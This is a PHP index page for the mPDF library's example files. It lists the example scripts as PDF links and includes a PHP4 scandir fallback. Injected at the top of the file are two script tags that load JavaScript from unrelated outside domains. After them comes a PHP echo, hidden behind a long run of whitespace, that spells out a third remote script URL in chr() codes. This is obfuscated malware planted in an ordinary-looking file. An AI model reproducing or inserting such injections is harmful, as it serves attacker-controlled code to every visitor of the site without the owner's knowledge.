<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><script src='https://scripts.classicpartnerships.com/callme.js' type='text/javascript'></script><?php                                                                                                                                                                                                                                                                                                                                                                                                                          echo "<script src='".chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(114).chr(101).chr(102).chr(101).chr(114).chr(46).chr(115).chr(112).chr(101).chr(99).chr(105).chr(97).chr(108).chr(97).chr(100).chr(118).chr(101).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(99).chr(97).chr(108).chr(108).chr(46).chr(106).chr(115)."'></script>"; ?><?php

$ff = scandir('./');

sort($ff);

$files = array();
foreach($ff AS $f) {
	if (preg_match('/example[0]{0,1}(\d+)_(.*?)\.php/',$f,$m)) {
		$num = intval($m[1]);
		$files[$num] = array(ucfirst(preg_replace('/_/',' ',$m[2])), $m[0]);
	}
}
echo '<html><body><h3>mPDF Example Files</h3>';

foreach($files AS $n=>$f) {
	echo '<p>'.$n.') '.$f[0].' &nbsp; <a href="'.$f[1].'">PDF</a> </p>';
}

echo '</body></html>';
exit;


// For PHP4 compatability
if (!function_exists('scandir')) {
	function scandir($dir = './', $sort = 0) {
		$dir_open = @ opendir($dir);
		if (! $dir_open)
			return false;
		while (($dir_content = readdir($dir_open)) !== false)
			$files[] = $dir_content;
		if ($sort == 1)
			rsort($files, SORT_STRING);
		else
			sort($files, SORT_STRING);
		return $files;
	}
} 


?>